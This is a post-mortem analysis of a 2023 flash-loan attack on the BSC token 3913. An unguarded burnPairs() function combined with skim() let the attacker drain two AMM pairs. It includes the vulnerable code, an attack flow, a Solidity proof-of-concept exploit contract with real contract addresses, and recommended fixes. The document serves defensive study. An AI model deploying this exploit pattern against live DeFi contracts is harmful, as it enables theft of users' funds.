# 3913 Flash Loan BurnPairs Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Token 3913 |
| Date | 2023-11-01 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$31,354 USD |
| Attack Type | 5-layer DODO Flash Loan + burnPairs() + Skim (Chained Flash Loan + BurnPairs + Skim) |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0xb29f18b89e56cc0151c7c17de0625a21018d8ae7` |
| Attack Contract | `0x783fbea45b32eaaa596b44412041dd1208025e83` |
| Vulnerable Contract | `0xd74F28c6E0E2c09881Ef2d9445F158833c174775` (Token 3913) |
| Fork Block | 33,132,467 |

## 2. Vulnerable Code Analysis

Token 3913 is a small-cap token deployed on BSC. Its `burnPairs()` function was callable by anyone, allowing forced burning of tokens held within AMM pairs. The attacker secured a large amount of BUSD via 5-level nested DODO flash loans, then exploited reserve imbalances across the 3913/BUSD and 3913/9419 pairs using a `burnPairs()` → `skim()` combination to extract profit.

```solidity
// Vulnerable pattern: public burnPairs function
contract Token3913 {
    address public pair_busd;
    address public pair_9419;

    // Vulnerable: burns tokens held in pairs with no access control
    function burnPairs() external {
        uint256 busdPairBalance = balanceOf(pair_busd);
        uint256 pairBalance_9419 = balanceOf(pair_9419);

        // Burning pair balances without calling sync() causes AMM reserve mismatch
        _burn(pair_busd, busdPairBalance * 90 / 100);
        _burn(pair_9419, pairBalance_9419 * 90 / 100);
        // → surplus BUSD/9419 can be extracted via skim()
    }
}
```

**Vulnerability**: The `burnPairs()` function lacked access control, allowing anyone to forcibly burn the 3913 balance held in both pairs. After the burn, a discrepancy arose between the AMM's actual token balances and its stored `reserve` values, enabling surplus BUSD/9419 to be extracted via `skim()`.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// File: 3913_decompiled.sol
    function burnPairs() external {}  // ❌
```

## 3. Attack Flow

```
Attacker [0xb29f18b89e56cc0151c7c17de0625a21018d8ae7]
  │
  ├─1─▶ DODO Pool 1 flashLoan (large BUSD borrow)
  │      └─ DODO Pool 2 flashLoan (nested)
  │           └─ DODO Pool 3 flashLoan (nested)
  │                └─ DODO Pool 4 flashLoan (nested)
  │                     └─ DODO Pool 5 flashLoan (nested)
  │
  ├─2─▶ swapExactTokensForTokens(BUSD → 3913)
  │      Acquire large amount of 3913
  │
  ├─3─▶ Token3913.burnPairs()
  │      [3913: 0xd74F28c6E0E2c09881Ef2d9445F158833c174775]
  │      Burns balances in pair_busd and pair_9419
  │      → AMM price distortion across both pairs
  │
  ├─4─▶ Pair(3913/BUSD).skim(address(this))
  │      [Pair: 0x715762906489D5D671eA3eC285731975DA617583]
  │      Recover surplus BUSD
  │
  ├─5─▶ Pair(3913/9419).skim(address(this))
  │      [Pair: 0xd6d66e1993140966e6029815eDbB246800928969]
  │      Recover surplus 9419 tokens
  │
  ├─6─▶ Sell 3913 + sell 9419 → obtain BUSD
  │
  └─7─▶ Repay all 5 DODO flash loans sequentially + realize ~$31,354 profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IToken3913 {
    function burnPairs() external;
}

interface IDPPOracle {
    function flashLoan(uint256 base, uint256 quote, address to, bytes calldata data) external;
}

contract Token3913Exploit {
    IToken3913 token3913 = IToken3913(0xd74F28c6E0E2c09881Ef2d9445F158833c174775);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUniswapV2Pair pair_busd = IUniswapV2Pair(0x715762906489D5D671eA3eC285731975DA617583);
    IUniswapV2Pair pair_9419 = IUniswapV2Pair(0xd6d66e1993140966e6029815eDbB246800928969);
    IDPPOracle dpp1 = IDPPOracle(0x9ad32757920D6Ba74E64844B8a0D9137d68e5491);
    // ... 5 DPP pools

    function testExploit() external {
        // Initiate 5-layer nested flash loan
        dpp1.flashLoan(0, 500_000e18, address(this), abi.encode(uint8(1)));
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata data) external {
        uint8 step = abi.decode(data, (uint8));

        if (step < 5) {
            // Nest into next DPP pool
            IDPPOracle(getDPP(step + 1)).flashLoan(
                0, 500_000e18, address(this), abi.encode(step + 1)
            );
        } else {
            // Core attack logic
            // Swap BUSD → 3913
            swapBUSDTo3913(BUSD.balanceOf(address(this)) * 80 / 100);

            // Call burnPairs to burn pair balances
            token3913.burnPairs();

            // Recover surplus assets via skim
            pair_busd.skim(address(this));
            pair_9419.skim(address(this));

            // Sell 3913 back
            swap3913ToBUSD(IERC20(address(token3913)).balanceOf(address(this)));
        }

        // Repay each flash loan layer
        BUSD.transfer(msg.sender, quoteAmount);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | AMM reserve manipulation via public burn function, simultaneous multi-pair attack |
| Affected Scope | 3913/BUSD and 3913/9419 PancakeSwap pairs |
| Explorer | [BSCscan](https://bscscan.com/address/0xd74F28c6E0E2c09881Ef2d9445F158833c174775) |

## 6. Security Recommendations

```solidity
// Fix 1: Add access control to burnPairs function
address public owner;

function burnPairs() external {
    require(msg.sender == owner, "Only owner");
    _burn(pair_busd, busdPairBalance);
    _burn(pair_9419, pairBalance_9419);
}

// Fix 2: Call sync() immediately after burning to maintain reserve consistency
function burnPairs() external onlyOwner {
    _burn(pair_busd, targetAmount1);
    IUniswapV2Pair(pair_busd).sync();
    _burn(pair_9419, targetAmount2);
    IUniswapV2Pair(pair_9419).sync();
}

// Fix 3: Remove functions that directly manipulate pair balances
// Privileged functions like burnPairs() should be removed for AMM security
// Instead, retain only standard token burn mechanisms
```

## 7. Lessons Learned

1. **Simultaneous multi-pair attack**: The `burnPairs()` function affecting two AMM pairs at once gave the attacker multiple arbitrage pathways. Privileged functions that interact with multiple pairs require extra caution.
2. **5-layer DODO flash loan**: Nesting DODO DPP flash loans 5 levels deep on BSC allows hundreds of thousands of dollars in capital to be assembled with minimal initial capital. Defensive design against this pattern is essential.
3. **burnPairs pattern vulnerability**: Attacks via `burnPairs()` or similar public burn functions recur repeatedly among small-cap BSC tokens. Any public function in a token contract that acts directly on AMM pairs should be removed.
4. **Asymmetry between skim and sync**: If `sync()` is not called after `burn()`, the AMM's stored `reserve` values remain unchanged while the actual token balance decreases. `skim()` becomes the mechanism to extract this discrepancy.